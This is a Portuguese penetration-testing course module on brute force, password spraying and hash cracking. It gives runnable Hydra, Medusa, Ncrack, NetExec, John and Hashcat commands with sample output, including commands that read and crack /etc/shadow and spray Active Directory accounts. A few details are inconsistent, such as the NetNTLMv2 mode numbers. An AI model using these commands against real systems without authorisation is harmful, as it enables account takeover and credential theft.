# 🔑 03. Brute Force e Password Spraying

> Força bruta é testar senhas automaticamente. Password spraying é testar 1 senha em muitos usuários. Ambos são vetores de ganho de acesso — e o mais eficaz em ambientes AD é o spraying.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 60min | ⭐⭐⭐ Intermediário | `hydra, medusa, ncrack, nxc` |

</div>

---

## 🎓 Por que isso importa?

Brute force e password spraying são os vetores mais comuns para ganho de acesso inicial. Segundo o Verizon DBIR 2025, **82% dos compromissos envolvem credenciais roubadas ou reutilizadas**. Em ambientes AD, password spraying é o ataque #1 porque testa 1 senha comum em milhares de contas sem disparar alertas.

**Diferença fundamental:**

| Brute Force | Password Spraying |
|:------------|:-------------------|
| Muitas senhas em **UM** usuário | **UMA** senha em **MUITOS** usuários |
| Rápido (muitas tentativas/segundo) | Lento (propositalmente) |
| Risco **ALTO** de lockout | Risco **BAIXO** de lockout |
| Wordlist grande (10.000+ senhas) | Wordlist pequena (5-10 senhas sazonais) |
| Ex: `admin: 10.000 tentativas` | Ex: `5.000 users: 1 tentativa cada` |

**Regra de ouro:** SEMPRE verifique a password policy ANTES de atacar. Se `lockout threshold: 5`, não exceda 3 tentativas por usuário.

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| Wordlists de senhas/usuários | Sim | Arquivo 01 deste módulo |
| Enumeração de usuários | Sim | Arquivo 02 deste módulo |
| O que é lockout policy | Sim | Arquivo 02 (pass-pol) |

---

## 🎯 Quando usar este módulo

- Quando encontrou um **serviço aberto** (SSH, FTP, HTTP, SMB, RDP) e não tem a senha
- Quando já enumerou **usuários válidos** (arquivo 02)
- Quando quer testar **credenciais padrão** em múltiplos hosts
- Para **password spraying** em ambientes Active Directory

---

## 🔄 Como funciona na prática

```
┌──────────────────────────────────────────────────────────┐
│  0. VERIFICAR PASSWORD POLICY                            │
│     - nxc smb <alvo> --pass-pol                          │
│     - Descobrir lockout threshold                        │
│     - Calcular quantas senhas testar por rodada          │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  1. ESCOLHER ABORDAGEM                                   │
│     - 1 usuário + muitas senhas → Brute Force            │
│     - 1 senha + muitos usuários → Password Spraying      │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  2. EXECUTAR ATAQUE                                      │
│     - Hydra/Medusa/Ncrack para brute force               │
│     - NetExec/Hydra para password spraying               │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  3. USAR CREDENCIAIS ENCONTRADAS                         │
│     - SSH: ssh user@target -p <porta>                    │
│     - SMB: smbclient //target/share -u user -p pass      │
│     - RDP: xfreerdp /v:target /u:user /p:pass           │
│     - Testar credenciais em outros serviços (reuse)      │
└──────────────────────────────────────────────────────────┘
```

---

## 🛠️ Ferramentas

| Ferramenta | Tipo | Quando usar |
|:-----------|:-----|:------------|
| **Hydra** | Brute Force + Spraying | Mais rápido, suporta 50+ protocolos |
| **Medusa** | Brute Force | Alternativa ao Hydra, bom para múltiplos hosts |
| **Ncrack** | Brute Force | Focado em serviços de rede (SSH, RDP, SMB) |
| **NetExec** | Password Spraying | Melhor para ambientes AD, verifica lockout |

---

## 🔓 Passo 0: Verificar Password Policy (ANTES de Atacar)

**Nunca pule este passo.** Se o lockout threshold for 5 e você testar 10 senhas, bloqueará as contas.

```bash
# Com NetExec (anônimo)
nxc smb 192.168.1.10 -u '' -p '' --pass-pol

# Com credenciais válidas
nxc smb 192.168.1.10 -u admin -p 'Admin123' --pass-pol
```

**✅ Output esperado:**
```
SMB  192.168.1.10  445  DC01  [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:EMPRESA.LOCAL) (signing:True) (SMBv1:False)
SMB  192.168.1.10  445  DC01  [+] EMPRESA.LOCAL\: (NULL)
SMB  192.168.1.10  445  DC01  [+] Dumping domain password info
SMB  192.168.1.10  445  DC01  [-] Password properties: DOMAIN_PASSWORD_COMPLEX
SMB  192.168.1.10  445  DC01  [-] Minimum password length: 8
SMB  192.168.1.10  445  DC01  [-] Account lockout threshold: 5    ← CRÍTICO
SMB  192.168.1.10  445  DC01  [-] Account lockout duration: 30 minutes
```

**O que procurar:**
- `Account lockout threshold: 5` → spray no máximo 3 senhas por rodada
- `Account lockout threshold: 0` → sem lockout (pode testar mais)
- `Minimum password length: 8` → senhas curtas não funcionam

---

## 🔐 Hydra — Brute Force em Qualquer Serviço

### Instalação

```bash
# Pré-instalado no Kali
hydra -h
```

### Flags Principais

| Flag | Descrição |
|:-----|:----------|
| `-l LOGIN` | Usuário único |
| `-L FILE` | Lista de usuários |
| `-p PASS` | Senha única |
| `-P FILE` | Lista de senhas |
| `-C FILE` | Combo file (`login:pass`) |
| `-x min:max:charset` | Brute force gerando senhas (ex: `1:4:a1%`) |
| `-e ns` | Extra check: `n`=senha nula, `s`=senha=user |
| `-t TASKS` | Threads (padrão 16; **use 4 para SSH**) |
| `-f` | Parar no primeiro sucesso (per host) |
| `-F` | Parar no primeiro sucesso (global) |
| `-u` | Loop por senha (testa cada senha em TODOS os users) |
| `-M FILE` | Lista de hosts alvo |
| `-o FILE` | Output em arquivo |
| `-s PORT` | Porta customizada |
| `-S` | Conexão via SSL |
| `-V` | Verbose completo (mostra cada user:pass) |
| `-W TIME` | Espera entre tentativas (anti-lockout) |
| `-R` | Restaurar sessão anterior |

### Exemplo 1 — SSH Brute Force (usuário único)

```bash
hydra -l admin -P /usr/share/seclists/Passwords/Top1000.txt ssh://192.168.1.100
```

**✅ Output esperado (SUCESSO):**
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-23 00:10:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
[DATA] attacking ssh://192.168.1.100:22/
[22][ssh] host: 192.168.1.100   login: admin   password: admin123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-23 00:11:05
```

**O que procurar:** A linha `[22][ssh] host: ... login: ... password: ...` indica credencial encontrada. A última linha confirma `1 valid password found`.

**✅ Output esperado (FALHA):**
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-23 00:15:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
[DATA] attacking ssh://192.168.1.100:22/
[STATUS] 1000.00 tries in 00:00:45, 1000.00 tries in 00:00:45, done in 00:00:45, ~1333.33 tries/min
0 of 1 target successfully completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-23 00:16:05
```

**O que procurar:** `0 valid passwords found` → nenhuma credencial encontrada. Sem linha `[XX][ssh]`.

### Exemplo 2 — HTTP POST Form Attack

```bash
hydra -l admin -P /usr/share/seclists/Passwords/Top1000.txt 192.168.1.50 http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Invalid credentials"
```

**✅ Output esperado (SUCESSO):**
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-23 00:20:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
[DATA] attacking http-post-form://192.168.1.50:80/login.php:username=^USER^&password=^PASS^&Login=Login:F=Invalid credentials
[80][http-post-form] host: 192.168.1.50   login: admin   password: letmein
[STATUS] attack finished for 192.168.1.50 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2025-10-23 00:22:15
```

**Sintaxe HTTP POST Form explicada:**
```
"/URL:PARAMS:F=FAILURE_STRING"
```
- `^USER^` → placeholder substituído pelo username
- `^PASS^` → placeholder substituído pela senha
- `F=` → string que indica FALHA na resposta
- `S=` → string que indica SUCESSO (alternativa ao `F=`)

### Exemplo 3 — Password Spraying com Hydra

```bash
# Flag -u: itera POR SENHA em vez de por user
hydra -L users.txt -P passwords.txt 192.168.1.100 ssh -u -V
```

**✅ Output esperado:**
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-13 10:30:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:50/p:10), ~32 tries per task
[DATA] attacking ssh://192.168.1.100:22/
[22][ssh] host: 192.168.1.100   login: admin   password: Summer2025!
[22][ssh] host: 192.168.1.100   login: mgarcia   password: Summer2025!
1 of 1 target successfully completed, 2 valid passwords found
Hydra finished at 2025-09-13 10:35:12
```

### Outros protocolos

```bash
# FTP
hydra -l admin -P passwords.txt ftp://192.168.1.100

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# SMB
hydra -l administrator -P passwords.txt smb://192.168.1.100

# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# Com porta específica
hydra -l admin -P passwords.txt -s 8080 ssh://192.168.1.100

# Múltiplos hosts
hydra -l admin -P passwords.txt -M targets.txt ssh
```

### Erros comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| `0 valid passwords found` | Wordlist errada ou failure string errada | Usar `-V -d` para debug |
| `WARNING: Many SSH configurations limit...` | Muitas threads para SSH | Usar `-t 4` |
| Trava no meio | Servidor bloqueou IP (fail2ban) | Usar `-W 5` para pausar |
| Form não funciona | Nomes dos campos errados | Inspecionar form no navegador |

---

## 🔐 Medusa — Brute Force Paralelo

### Instalação

```bash
sudo apt install -y medusa
```

### Flags Principais

| Flag | Descrição |
|:-----|:----------|
| `-h TARGET` | Host/IP único |
| `-H FILE` | Lista de hosts |
| `-u USER` | Username único |
| `-U FILE` | Lista de usernames |
| `-p PASS` | Senha única |
| `-P FILE` | Lista de senhas |
| `-M MODULE` | Módulo a usar (ex: `ssh`, `http`, `smbnt`) |
| `-m PARAM` | Parâmetro do módulo |
| `-n PORT` | Porta não-padrão |
| `-t NUM` | Threads de login concorrentes |
| `-T NUM` | Hosts concorrentes |
| `-f` | Parar no primeiro par válido por host |
| `-F` | Parar no primeiro par válido global |
| `-L` | Paralelizar por username |

### Exemplo 1 — SSH Brute Force

```bash
medusa -h 192.168.1.100 -u admin -P /usr/share/seclists/Passwords/Top1000.txt -M ssh
```

**✅ Output esperado (SUCESSO):**
```
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks 2024

ACCOUNT CHECK: [ssh] Host: 192.168.1.100 (1/1) User: admin (1/1) Password: password (1/1000)
ACCOUNT CHECK: [ssh] Host: 192.168.1.100 (1/1) User: admin (1/1) Password: 123456 (2/1000)
ACCOUNT CHECK: [ssh] Host: 192.168.1.100 (1/1) User: admin (1/1) Password: admin123 (3/1000)
ACCOUNT FOUND: [ssh] Host: 192.168.1.100 User: admin Password: admin123 [SUCCESS]
```

**O que procurar:** A linha `ACCOUNT FOUND: ... [SUCCESS]` indica credencial encontrada.

### Exemplo 2 — HTTP Form Attack

```bash
medusa -h 192.168.1.50 -u admin -P passwords.txt -M http \
  -m HTTP:method:POST \
  -m HTTP:uri:/login.php \
  -m HTTP:body:username=^USER^&password=^PASS^ \
  -m HTTP:failure:Invalid credentials
```

### Listar módulos disponíveis

```bash
medusa -d
```

### Erros comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| `ACCOUNT CHECK` mas nenhum `ACCOUNT FOUND` | Wordlist não contém a senha | Usar wordlist maior |
| `Module not found` | Módulo não compilado | Verificar com `medusa -d` |
| `381 thread limit` | Muitas threads | Reduzir `-t` |

---

## 🔐 Ncrack — Focado em Serviços de Rede

### Instalação

```bash
# Pré-instalado no Kali
ncrack -h
```

> **Nota:** Ncrack foi escrito em 2009 e a última versão (0.7) é de 2019. O projeto está sem manutenção ativa. Para novos projetos, prefira Hydra.

### Flags Principais

| Flag | Descrição |
|:-----|:----------|
| `-U FILE` | Arquivo de usernames |
| `-P FILE` | Arquivo de senhas |
| `--user LIST` | Usernames separados por vírgula |
| `--pass LIST` | Senhas separadas por vírgula |
| `--passwords-first` | Iterar senhas primeiro |
| `-p SERVICE:PORT` | Serviço/porta global |
| `-oN FILE` | Output normal (texto) |
| `-oX FILE` | Output XML |
| `-T[0-5]` | Timing template (0=lento, 5=insano) |
| `-iL FILE` | Input de lista de hosts |

### Exemplo 1 — SSH Brute Force

```bash
ncrack -v -U users.txt -P passwords.txt 192.168.1.100:22
```

**✅ Output esperado:**
```
Starting Ncrack 0.7 ( http://ncrack.org )

Ncrack stats: 0.01 elapsed; 0 hosts completed, 1 waiting
Ncrack stats: 0.50 elapsed; 0.00/0.01 Find/Max rates 0.00/0.00; 0 discovered credentials
Discovered credentials for ssh on 192.168.1.100 22/tcp:
192.168.1.100:22 ssh  admin  password123

Ncrack finished.
```

**O que procurar:** A linha `Discovered credentials for ssh on ...` seguida de `<IP>:<PORTA> <PROTOCOLO> <USER> <PASS>`.

### Exemplo 2 — Múltiplos Serviços

```bash
ncrack -v -v -T4 -U users.txt -P passwords.txt 192.168.1.100[ssh,telnet,ftp]
```

**✅ Output esperado:**
```
Starting Ncrack 0.7 ( http://ncrack.org )

Ncrack stats: 1.50 elapsed; 1.00/1.00 hosts completed; 0 active tasks; 0 pending tasks
Discovered credentials for telnet on 192.168.1.100 23/tcp:
192.168.1.100:23 telnet  admin  admin

Ncrack finished.
```

---

## 🔑 John the Ripper — Cracking de Hashes (CPU)

John the Ripper quebra hashes offline. Suporta centenas de formatos e detecta automaticamente o tipo do hash. É a ferramenta **primeira opção** quando você coleta hashes de um sistema (ex: `/etc/shadow`, banco de dados, captura de rede).

### Instalação

```bash
sudo apt install -y john
```

### Flags Principais

| Flag | Descrição |
|:-----|:----------|
| `--wordlist=<arquivo>` | Wordlist para brute force |
| `--rules` | Aplicar regras de mutação (adiciona maiúsculas, números, símbolos) |
| `--format=<formato>` | Forçar formato do hash (ex: `raw-md5`, `bcrypt`, `nt`) |
| `--list=formats` | Listar todos os formatos suportados |
| `--incremental` | Brute force puro (lento, testa todas as combinações) |
| `--single` | Modo single (usa info do `/etc/passwd` para gerar candidatos) |
| `--show` | Mostrar hashes já crackeados |
| `--session=<nome>` | Salvar/carregar sessão (pode interromper e continuar depois) |
| `--fork=<n>` | Usar N processos paralelos (acelera em multi-core) |

### Exemplo 1 — Cracking básico com wordlist

```bash
# Criar arquivo com hashes (um por linha)
cat > hashes.txt << 'EOF'
5d41402abc4b2a76b9719d911017c592
e99a18c428cb38d5f260853678922e03
098f6bcd4621d373cade4e832627b4f6
EOF

# Crackear (john detecta o formato automaticamente)
john --wordlist=/usr/share/seclists/Passwords/Top1000.txt hashes.txt
```

**✅ Output esperado:**
```
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (Raw-MD5 [128/128 AVX 4x3])
Cost 1 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'S' for status, almost any other key for status
hello            (?)
world            (?)
test             (?)
3g 0:00:00:00 DONE 2/3 (2025-10-23 00:10) 100.0g/s 12345p/s 12345c/s 12345C/s
Session completed
```

**O que procurar:** Linhas com `<senha> (<usuario>)` indicam hashes crackeados. `Session completed` = terminou.

### Exemplo 2 — Identificar formato antes de crackear

```bash
# Listar formatos suportados
john --list=formats | grep -i md5
```

**✅ Output esperado:**
```
Raw-MD5, Raw-SHA1, Raw-SHA256, Raw-SHA512, ...
```

```bash
# Forçar formato específico (quando john não detecta)
john --format=raw-md5 --wordlist=passwords.txt hashes.txt
```

### Exemplo 3 — Com regras de mutação

```bash
# --rules aplica mutações: maiúsculas, números, símbolos no final
john --wordlist=/usr/share/seclists/Passwords/Top1000.txt --rules hashes.txt
```

**O que acontece:** O John pega cada linha da wordlist e aplica regras como `password` → `Password`, `password1`, `password!`, `p@ssword`, etc. Aumenta drasticamente a cobertura sem wordlist maior.

### Exemplo 4 — Crackear /etc/shadow

```bash
# Combinar /etc/passwd + /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Crackear
john --wordlist=/usr/share/seclists/Passwords/Top10000.txt unshadowed.txt

# Ver resultados
john --show unshadowed.txt
```

**✅ Output esperado:**
```
root:$6$xyz...:18000:0:99999:7:::
admin:$6$abc...:18000:0:99999:7:::

2 password hashes cracked, 0 left
```

### Exemplo 5 — Sessão interrompida e retomada

```bash
# Iniciar com nome de sessão
john --session=meu_crack --wordlist=rockyou.txt hashes.txt

# Parar com Ctrl+C (salva progresso automaticamente)

# Retomar depois
john --restore=meu_crack
```

### Formatos mais comuns

| Formato | Exemplo de hash | Modo John |
|:--------|:----------------|:----------|
| MD5 | `5d41402abc4b2a76b9719d911017c592` | `--format=raw-md5` |
| SHA-256 | `2cf24dba5fb0a30e26e83b2ac5b9e29e...` | `--format=raw-sha256` |
| bcrypt | `$2a$10$N9qo8uLOickgx2ZMRZoMye...` | `--format=bcrypt` |
| NTLM | `aad3b435b51404eeaad3b435b51404ee` | `--format=nt` |
| descrypt | `rEK1ecacw.7.c` | auto-detect |

### Erros comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| `No password hashes loaded` | Formato errado ou hash inválido | Use `--format=` correto ou verifique o hash |
| `0 password hashes cracked` | Wordlist não contém a senha | Tente com `--rules` ou wordlist maior |
| `Session halted` | Ctrl+C ou falta de memória | Retome com `john --restore=<sessão>` |

---

## 🖥️ Hashcat — Cracking de Hashes com GPU

Hashcat é **100x mais rápido** que John para hashes simples porque usa a GPU. Suporta 300+ modos de hash e máscaras inteligentes para brute force.

### Instalação

```bash
sudo apt install -y hashcat
```

### Flags Principais

| Flag | Descrição |
|:-----|:----------|
| `-m <modo>` | Modo/tipo do hash (obrigatório) |
| `-a <modo>` | Modo de ataque (0=straight, 3=máscara) |
| `-o <arquivo>` | Salvar hashes crackeados em arquivo |
| `--show` | Mostrar hashes crackeados de uma sessão anterior |
| `-r <arquivo>` | Regra de mutação (expande wordlist) |
| `-j` / `-k` | Regra para input/output (john2hashcat) |
| `-b` | Benchmark (testar performance da GPU) |
| `--list` | Listar modos de hash e regras disponíveis |
| `--username` | Ignorar usernames nos hashes (formato `user:hash`) |
| `--remove` | Remover hash crackeados do arquivo original |
| `--force` | Forçar execução (ignorar avisos) |

### Modos de hash mais usados

| Modo (-m) | Tipo | Quando usar |
|:----------|:-----|:------------|
| `0` | MD5 | hashes genéricos Linux/web |
| `100` | SHA1 | hashes legados |
| `1400` | SHA-256 | hashes modernos Linux |
| `1000` | NTLM | hashes Windows (SAM) |
| `3200` | bcrypt | hashes de senhas web (Node.js, PHP) |
| `1800` | sha512crypt | `/etc/shadow` moderno |
| `5500` | NetNTLMv2 | Capturas Responder (rede) |
| `13100` | Kerberos TGS-REP | Kerberoasting AD |
| `16800` | WPA-PMKID | WiFi |

### Modos de ataque

| Modo (-a) | Descrição | Exemplo |
|:----------|:----------|:--------|
| `0` | Straight (wordlist puro) | `hashcat -m 0 hash.txt wordlist.txt` |
| `3` | Brute force (máscara) | `hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d` |
| `6` | Wordlist + máscara | `hashcat -m 0 hash.txt wordlist.txt -a 6 ?d?d` |
| `7` | Máscara + wordlist | `hashcat -m 0 hash.txt -a 7 ?d?d wordlist.txt` |

### Placeholders de máscara

| Símbolo | Significado |
|:--------|:------------|
| `?l` | Minúsculas (a-z) |
| `?u` | Maiúsculas (A-Z) |
| `?d` | Números (0-9) |
| `?s` | Símbolos (!@#$%^&*) |
| `?a` | Todos os caracteres |
| `?b` | Bytes 0x00-0xff |

### Exemplo 1 — MD5 com wordlist

```bash
hashcat -m 0 hash.txt /usr/share/seclists/Passwords/Top1000.txt
```

**✅ Output esperado:**
```
hashcat (v6.2.6) starting...

CUDA API (CUDA 12.2)
├─ Device #1: NVIDIA GeForce RTX 3060, 12039/12192 MB, 28MCU

Minimum password length supported: 0
Maximum password length supported: 256

Hashes: 5 digests; 5 unique digests, 5 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/5 rotates
Rules: 1

Optimizer guide activated...

Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/5 rotates

Session..........: hashcat
Status...........: Running
Rules.Mode.......: Rule
Hash.Mode........: 0 (MD5)
Speed.#1.........:   283.4 MH/s (33.13ms) @ Accel:64 Loops:1024 Thr:256 Vec:1

5d41402abc4b2a76b9719d911017c592:hello
e99a18c428cb38d5f260853678922e03:abc123
```

**O que procurar:** A linha `<hash>:<senha>` indica hash crackeado. `Speed.#1` mostra taxa de hashes/segundo.

### Exemplo 2 — Brute force com máscara

```bash
# 6 dígitos (000000-999999)
hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d

# 1 maiúscula + 2 minúsculas + 3 números
hashcat -m 0 hash.txt -a 3 ?u?l?l?d?d?d

# 8 caracteres (todas as combinações — LENTO)
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a?a
```

### Exemplo 3 — Wordlist + regras

```bash
# best64.rule: 64 regras básicas (maiúscula, números, símbolos)
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# d3ad0ne.rule: regras agressivas (milhares de mutações)
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
```

**O que acontece:** A regra pega cada linha da wordlist e gera variantes. `password` → `Password`, `password1`, `p@ssword`, `Password123!`, etc. Uma wordlist de 10.000 senhas pode virar 500.000 candidatos.

### Exemplo 4 — NTLM (Windows SAM)

```bash
# Dump do SAM (conseguir hashes NTLM)
hashcat -m 1000 ntlm_hashes.txt /usr/share/seclists/Passwords/rockyou.txt
```

### Exemplo 5 — NetNTLMv2 (capturas Responder)

```bash
# Formato: user::domain:response:challenge:hash
hashcat -m 5600 capture.txt /usr/share/seclists/Passwords/rockyou.txt -r rules/best64.rule
```

### Exemplo 6 — Benchmark

```bash
# Testar performance da GPU
hashcat -b
```

**✅ Output esperado:**
```
Speed.#1.........:   283.4 MH/s (33.13ms) @ Accel:64 Loops:1024 Thr:256 Vec:1
```

### Regras de hashcat

```bash
# Listar regras disponíveis
ls /usr/share/hashcat/rules/

# Criar regra customizada
cat > custom.rule
l          # lowercase all
u          # uppercase first
c          # capitalize
$1         # append "1"
$!         # append "!"
^1         # prepend "1"
```

### Conversão John → Hashcat

```bash
# Formato raw do John é compatível com Hashcat
# Ex: John Raw-MD5 = Hashcat -m 0
# Ex: John Raw-SHA256 = Hashcat -m 1400
# Ex: John NT = Hashcat -m 1000

# Verificar formato do John
john --list=formats | grep -i md5
# Se mostrar "Raw-MD5" → Hashcat usa -m 0
```

### Erros comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| `CUDA error: out of memory` | GPU sem memória suficiente | Reduza `-n` (batch size) ou use wordlist menor |
| `No hashes loaded` | Formato errado ou arquivo vazio | Verifique `-m` e o conteúdo do arquivo |
| `Token length exception` | Hash com formato inválido | Verifique se o hash está no formato correto |
| `All hashes found as potfile` | Todos já foram crackeados | Use `--show` para ver resultados anteriores |

---

## 🔄 Fluxo de Cracking: John vs Hashcat

```
┌──────────────────────────────────────────────────────────┐
│  1. COLETAR HASHES                                        │
│     - /etc/shadow → unshadow                             │
│     - Banco de dados → SQL query                         │
│     - Captura de rede → Responder (NTLMv2)               │
│     - SAM dump → secretsdump (Impacket)                  │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  2. IDENTIFICAR FORMATO                                  │
│     - john --list=formats                                │
│     - hashid '<hash>'                                    │
│     - Ex: $2a$10$ → bcrypt, aad3b... → NTLM              │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  3. TENTAR COM JOH (CPU)                                 │
│     - john --wordlist=small.txt hash.txt                 │
│     - Se não crackear → john --rules hash.txt            │
│     - john salva progresso → pode interromper            │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  4. SE JOH NÃO CRACKEAR → HASHCAT (GPU)                 │
│     - hashcat -m <modo> hash.txt wordlist.txt           │
│     - Com regras: -r best64.rule                        │
│     - Com máscara: -a 3 ?d?d?d?d?d?d                    │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  5. USAR CREDENCIAIS                                     │
│     - Logar nos serviços (SSH, FTP, SMB, RDP)            │
│     - Testar em outros hosts (credential reuse)          │
│     - Pivotar para outras máquinas                       │
└──────────────────────────────────────────────────────────┘
```

**Regra:** John primeiro (mais formatos, auto-detect). Se não crackear ou se precisar de velocidade → Hashcat (GPU, 300+ modos).

---

## 💧 Password Spraying com NetExec

Password spraying é o ataque **MAIS eficaz em ambientes AD** porque:
- Domínios têm thresholds de lockout
- Usuários escolhem senhas previsíveis (`Summer2025!`, `Company2024!`)
- 1 spray de 1 senha em 5.000 users pode encontrar 20-30 credenciais

### Passo 1 — Verificar lockout policy

```bash
nxc smb 192.168.1.10 -u '' -p '' --pass-pol
```

### Passo 2 — Enumerar usuários

```bash
nxc smb 192.168.1.10 -u '' -p '' --users-export users.txt
```

### Passo 3 — Password Spray

```bash
# UMA senha em TODOS os users
nxc smb 192.168.1.10 -u users.txt -p 'Summer2025!' --continue-on-success
```

**✅ Output esperado:**
```
SMB  192.168.1.10  445  DC01  [+] EMPRESA.LOCAL\jdoe:Summer2025!
SMB  192.168.1.10  445  DC01  [+] EMPRESA.LOCAL\mgarcia:Summer2025!
SMB  192.168.1.10  445  DC01  [-] EMPRESA.LOCAL\jsmith:Summer2025!
SMB  192.168.1.10  445  DC01  [-] EMPRESA.LOCAL\abrown:Summer2025!
```

**Legenda:**
- `[+]` = credencial válida encontrada
- `[-]` = credencial inválida
- `(Pwn3d!)` = usuário é **Local Admin** (pode executar comandos remotamente)

### Passo 4 — Spray com múltiplas senhas (1:1)

```bash
# Cada user testa UM password da lista (não todas)
nxc smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

### Spray em sub-rede inteira

```bash
nxc smb 192.168.1.0/24 -u users.txt -p 'Summer2025!' --continue-on-success
```

---

## 📋 Resumo: Quando Usar Cada Abordagem

| Cenário | Ferramenta | Comando |
|:--------|:-----------|:--------|
| SSH/FTP 1 usuário + wordlist | Hydra | `hydra -l user -P passwords.txt ssh://target` |
| HTTP form 1 usuário | Hydra | `hydra -l user -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=error"` |
| Password spraying SMB | NetExec | `nxc smb target -u users.txt -p 'Pass!' --continue-on-success` |
| Múltiplos hosts SSH | Hydra | `hydra -l user -P passwords.txt -M targets.txt ssh` |
| Brute force paralelo | Medusa | `medusa -h target -u user -P passwords.txt -M ssh` |
| Múltiplos serviços | Ncrack | `ncrack -U users.txt -P passwords.txt target[ssh,ftp,rdp]` |

---

## ❌ Erros Comuns

| Erro | Solução |
|:-----|:--------|
| "Não sei qual protocolo usar" | Verifique o que o Nmap mostrou aberto (22=SSH, 21=FTP, 445=SMB, 3389=RDP) |
| "Hydra trava no meio" | Reduza threads (`-t 4`) ou adicione pausa (`-W 5`) |
| "Conta bloqueada" | Verifique `--pass-pol` antes; aguarde duração do lockout |
| "Form não funciona" | Inspecione o form no navegador para descobrir nomes dos campos |
| "Ncrack: Service not supported" | Verifique se o serviço está na lista: `ncrack --list` |
| "Muitos falsos positivos" | Use `F=` (failure string) correto — inspecione a resposta HTTP |

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | O que praticar | Tempo |
|---|:----------:|:----|:---------------|:-----:|
| 1 | TryHackMe | [Hydra](https://tryhackme.com/room/hydra) | Brute force SSH, FTP e HTTP forms | 45min |
| 2 | TryHackMe | [Brute It](https://tryhackme.com/room/bruteit) | Brute force com wordlists, cracking com John | 45min |
| 3 | HackTheBox | [Respawned](https://app.hackthebox.com/machines) | Password spraying em ambiente AD | 60min |
| 4 | OverTheWire | [Bandit Natas](https://overthewire.org/wargames/natas/) | Brute force HTTP em cenário web | 30min |

---

## 📚 Referências

- [HackTricks — Brute Force](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force)
- [PayloadsAllTheThings — Brute Force](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force)
- [THC-Hydra — GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Medusa — Foofus](http://www.foofus.net/?page=Medusa)
- [Ncrack — Nmap](https://nmap.org/ncrack/)
- [NetExec Wiki](https://www.netexec.wiki/)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Verificar password policy com `nxc smb --pass-pol` antes de atacar
- [ ] Executar brute force SSH/FTP com Hydra e interpretar o output
- [ ] Atacar HTTP POST forms com Hydra (formato `^USER^`/`^PASS^`/`F=`)
- [ ] Executar password spraying com NetExec em sub-rede inteira
- [ ] Usar Medusa para brute force paralelo em múltiplos hosts
- [ ] Saber a diferença entre brute force e password spraying
- [ ] Ajustar threads e pausas para evitar lockout
- [ ] Usar credenciais encontradas em outros serviços (credential reuse)
